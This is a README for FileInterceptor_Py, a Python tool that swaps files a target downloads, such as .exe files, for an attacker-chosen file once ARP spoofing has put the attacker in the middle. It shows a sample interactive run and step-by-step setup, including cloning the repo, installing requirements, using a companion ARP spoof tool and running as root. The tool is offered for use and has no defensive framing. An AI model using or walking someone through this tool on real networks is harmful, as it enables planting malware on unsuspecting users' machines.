# FileInterceptor_Py
A file interceptor is exactly what it sounds like. It replaces files downloaded on target system with a specified file.

```
╭─compromyse@Aspire ~/Projects/FileInterceptor_Py ‹main*› 
╰─$ sudo ~/.pyenv/versions/3.6.0/bin/python3.6 FileInterceptor.py 

███████╗██╗██╗░░░░░███████╗██╗███╗░░██╗████████╗███████╗██████╗░░█████╗░███████╗██████╗░████████╗░█████╗░██████╗░
██╔════╝██║██║░░░░░██╔════╝██║████╗░██║╚══██╔══╝██╔════╝██╔══██╗██╔══██╗██╔════╝██╔══██╗╚══██╔══╝██╔══██╗██╔══██╗
█████╗░░██║██║░░░░░█████╗░░██║██╔██╗██║░░░██║░░░█████╗░░██████╔╝██║░░╚═╝█████╗░░██████╔╝░░░██║░░░██║░░██║██████╔╝
██╔══╝░░██║██║░░░░░██╔══╝░░██║██║╚████║░░░██║░░░██╔══╝░░██╔══██╗██║░░██╗██╔══╝░░██╔═══╝░░░░██║░░░██║░░██║██╔══██╗
██║░░░░░██║███████╗███████╗██║██║░╚███║░░░██║░░░███████╗██║░░██║╚█████╔╝███████╗██║░░░░░░░░██║░░░╚█████╔╝██║░░██║
╚═╝░░░░░╚═╝╚══════╝╚══════╝╚═╝╚═╝░░╚══╝░░░╚═╝░░░╚══════╝╚═╝░░╚═╝░╚════╝░╚══════╝╚═╝░░░░░░░░╚═╝░░░░╚════╝░╚═╝░░╚═╝

User is root, the script can continue...


ARP spoof and get to the man in the middle.


What file extention needs to be spoofed? (.exe, .pdf, etc)

> .exe


Enter the direct download link for the file to be downloaded. (https://example.org/example.file)

> https://example.org/example.exe


Tell me a queue number that is not being used (0, 1, 2, etc)

> 0
Spoofing the file...
^C
Flushing Iptables rules and exiting...
```

# Running

> Install python and git

* Install pyenv from https://github.com/pyenv/pyenv-installer

* Install python 3.6 from pyenv because netfilterqueue does not support 3.6 < python.

> Clone git repository
```
git clone https://github.com/compromyse/FileInterceptor_Py
```

> Install script requirements
```
sudo python3.6 -m pip install -r requirements.txt
```


> Arp spoof

Go to https://github.com/compromyse/ArpSpoof_Py and use it to get man in the middle before running the script

> Run the script as **root**
```
sudo python3.6 FileInterceptor.py
```

# Thanks!